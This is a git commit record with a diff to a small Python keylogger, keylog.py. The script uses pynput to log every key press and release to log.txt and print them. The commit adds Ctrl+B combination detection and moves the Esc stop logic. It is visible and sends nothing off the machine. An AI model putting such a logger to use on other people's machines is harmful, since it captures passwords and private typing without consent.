6f5e20b5fdafa78495cc865fd3a149c1f63afc6f
Unknown <dbowers88@gmail.com>
2019-08-23 14:25:58 -0700

    combo support
    Added code for key combos

--- keylog.py
+++ keylog.py
@@ -1,20 +1,29 @@
 import pynput 
+from pynput import keyboard
 from pynput.keyboard import Key, Listener  
 import logging
+
+COMBINATION = {keyboard.Key.ctrl, keyboard.KeyCode(char='b')}
+current = set()
 
 log_dir = ""
 logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format= '%(message)s')
 
-def on_press(key):
+def on_press(key):        
     logging.info(str(key))
     print('{0} key pressed'.format(key))
+    if key in COMBINATION:
+        current.add(key)
+        if all(k in current for k in COMBINATION):
+                print("That's a bingo!")
+    if key == keyboard.Key.esc:
+        print ('Closing Listener') 
+        listener.stop()
 
 def on_release(key):
     logging.info(str(key))
     print('{0} key released'.format(key))
-    if key == Key.esc:
-        print ('Closing Listener') 
-        return False #Stop Listener
+
 
 with Listener(
     on_press=on_press,
